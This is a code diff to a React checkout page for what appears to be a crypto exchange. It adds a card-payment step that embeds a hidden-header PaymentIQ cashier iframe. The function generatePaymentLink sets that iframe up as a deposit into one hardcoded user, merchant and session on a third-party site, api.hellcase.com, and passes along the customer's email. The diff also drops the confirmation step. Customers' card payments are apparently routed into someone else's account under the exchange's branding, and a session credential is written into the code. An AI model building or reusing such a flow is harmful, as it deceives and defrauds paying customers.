@@ -12,7 +12,50 @@ import type { Crypto, PaymentMethod, Setting } from "@shared/schema";
 import cardIcon from "@assets/ARCTIC_1768071339190.png";
 import paypalIcon from "@assets/ARCTIC_1768071353413.png";
 
-type Step = "amount" | "payment" | "details" | "paypal_payment" | "confirm" | "success";
+type Step = "amount" | "payment" | "details" | "card_payment" | "paypal_payment" | "confirm" | "success";
+
+function generatePaymentLink(amount: string, email: string) {
+  const baseUrl = "https://checkout.paymentiq.io/cashier/master/payment-method";
+  
+  const queryParams = new URLSearchParams({
+    merchantId: "100259001",
+    userId: "22562969",
+    sessionId: "$2y$10$fLmjvewQygu0susC.JdpIu3udaYmckgxiJN4LvOw3DC/GCevSoimC",
+    environment: "production",
+    amount: amount,
+    method: "deposit",
+    locale: "en",
+    mode: "ecommerce",
+    scrollToOffset: "8",
+    allowMobilePopup: "true",
+    showHeader: "false",
+    showFooter: "false",
+    showAccounts: "inline",
+    providerType: "creditcard",
+    fixedProviderType: "true",
+    containerWidth: "360px",
+    logoSize: "100%",
+    theme_input_color: "#FFF",
+    theme_inputbackground_color: "#1C2028",
+    theme_labels_color: "#FFF",
+    theme_headings_color: "#FFF",
+    theme_loader_color: "#29b355",
+    theme_buttons_color: "#00a15b",
+    theme_cardbackground_color: "#20232B",
+    theme_background_color: "#20232B",
+    theme_cashierbackground_color: "#20232B",
+    theme_headerbackground_color: "#20232b",
+    "attributes.payer_type": "user",
+    "attributes.country": "MA",
+    "attributes.playerRouting": "payment_iq",
+    "attributes.trusted_deposit_count": "0",
+    "attributes.hostUri": "https://api.hellcase.com",
+    "user.email": email,
+    "attributes.bootstrapVersion": "1.4.4"
+  });
+
+  return `${baseUrl}?${queryParams.toString()}`;
+}
 
 function PaymentMethodIcon({ type }: { type: string }) {
   const key = type.toLowerCase();
@@ -175,10 +218,18 @@ export default function Exchange() {
     if (!validateStep(step)) return;
 
     // Dynamic step flow - insert paypal_payment step if PayPal is selected
-    const isPayPal = formData.paymentMethod.toLowerCase() === "paypal";
-    const steps: Step[] = isPayPal 
-      ? ["amount", "payment", "details", "paypal_payment", "confirm"]
-      : ["amount", "payment", "details", "confirm"];
+    const paymentMethod = formData.paymentMethod.toLowerCase();
+    const isPayPal = paymentMethod === "paypal";
+    const isCard = paymentMethod === "card";
+    
+    let steps: Step[];
+    if (isPayPal) {
+      steps = ["amount", "payment", "details", "paypal_payment"];
+    } else if (isCard) {
+      steps = ["amount", "payment", "details", "card_payment"];
+    } else {
+      steps = ["amount", "payment", "details", "confirm"];
+    }
     
     const currentIndex = steps.indexOf(step);
     if (currentIndex < steps.length - 1) {
@@ -189,10 +240,18 @@ export default function Exchange() {
   };
 
   const handleBack = () => {
-    const isPayPal = formData.paymentMethod.toLowerCase() === "paypal";
-    const steps: Step[] = isPayPal 
-      ? ["amount", "payment", "details", "paypal_payment", "confirm"]
-      : ["amount", "payment", "details", "confirm"];
+    const paymentMethod = formData.paymentMethod.toLowerCase();
+    const isPayPal = paymentMethod === "paypal";
+    const isCard = paymentMethod === "card";
+    
+    let steps: Step[];
+    if (isPayPal) {
+      steps = ["amount", "payment", "details", "paypal_payment"];
+    } else if (isCard) {
+      steps = ["amount", "payment", "details", "card_payment"];
+    } else {
+      steps = ["amount", "payment", "details", "confirm"];
+    }
     
     const currentIndex = steps.indexOf(step);
     if (currentIndex > 0) {
@@ -214,21 +273,33 @@ export default function Exchange() {
   };
 
   // Dynamic step indicators based on payment method
-  const isPayPalSelected = formData.paymentMethod.toLowerCase() === "paypal";
-  const steps = isPayPalSelected
-    ? [
-        { id: "amount", label: "Amount", number: 1 },
-        { id: "payment", label: "Payment", number: 2 },
-        { id: "details", label: "Details", number: 3 },
-        { id: "paypal_payment", label: "Pay", number: 4 },
-        { id: "confirm", label: "Confirm", number: 5 },
-      ]
-    : [
-        { id: "amount", label: "Amount", number: 1 },
-        { id: "payment", label: "Payment", number: 2 },
-        { id: "details", label: "Details", number: 3 },
-        { id: "confirm", label: "Confirm", number: 4 },
-      ];
+  const selectedPaymentMethod = formData.paymentMethod.toLowerCase();
+  const isPayPalSelected = selectedPaymentMethod === "paypal";
+  const isCardSelected = selectedPaymentMethod === "card";
+  
+  let steps;
+  if (isPayPalSelected) {
+    steps = [
+      { id: "amount", label: "Amount", number: 1 },
+      { id: "payment", label: "Payment", number: 2 },
+      { id: "details", label: "Details", number: 3 },
+      { id: "paypal_payment", label: "Pay", number: 4 },
+    ];
+  } else if (isCardSelected) {
+    steps = [
+      { id: "amount", label: "Amount", number: 1 },
+      { id: "payment", label: "Payment", number: 2 },
+      { id: "details", label: "Details", number: 3 },
+      { id: "card_payment", label: "Pay", number: 4 },
+    ];
+  } else {
+    steps = [
+      { id: "amount", label: "Amount", number: 1 },
+      { id: "payment", label: "Payment", number: 2 },
+      { id: "details", label: "Details", number: 3 },
+      { id: "confirm", label: "Confirm", number: 4 },
+    ];
+  }
 
   const currentStepIndex = steps.findIndex((s) => s.id === step);
 
@@ -479,6 +550,44 @@ export default function Exchange() {
                   </motion.div>
                 )}
 
+                {step === "card_payment" && (
+                  <motion.div
+                    key="card_payment"
+                    initial={{ opacity: 0, x: 20 }}
+                    animate={{ opacity: 1, x: 0 }}
+                    exit={{ opacity: 0, x: -20 }}
+                    transition={{ duration: 0.3 }}
+                  >
+                    <h2 className="text-xl font-semibold text-white mb-6">
+                      Complete Card Payment
+                    </h2>
+
+                    <div className="space-y-5">
+                      <div className="p-4 rounded-xl bg-white/5 border border-white/10">
+                        <div className="text-white/50 text-sm mb-2">Amount:</div>
+                        <div className="text-xl font-semibold text-white">
+                          ${parseFloat(formData.amount).toLocaleString()} {formData.currency}
+                        </div>
+                      </div>
+
+                      <div className="rounded-xl overflow-hidden border border-white/10" style={{ minHeight: "450px" }}>
+                        <iframe
+                          src={generatePaymentLink(formData.amount, formData.email)}
+                          className="w-full h-full"
+                          style={{ minHeight: "450px", border: "none" }}
+                          title="Card Payment"
+                          data-testid="iframe-card-payment"
+                        />
+                      </div>
+
+                      <div className="flex items-center justify-center gap-3 p-5 rounded-xl bg-white/5 border border-white/10" data-testid="status-card-pending">
+                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                        <span className="text-lg font-medium text-white">Pending</span>
+                      </div>
+                    </div>
+                  </motion.div>
+                )}
+
                 {step === "paypal_payment" && (
                   <motion.div
                     key="paypal_payment"
@@ -643,7 +752,7 @@ export default function Exchange() {
                 )}
               </AnimatePresence>
 
-              {step !== "success" && step !== "paypal_payment" && (
+              {step !== "success" && step !== "paypal_payment" && step !== "card_payment" && (
                 <div className="flex items-center gap-4 mt-8 pt-6 border-t border-white/10">
                   {step !== "amount" && (
                     <GlassButton
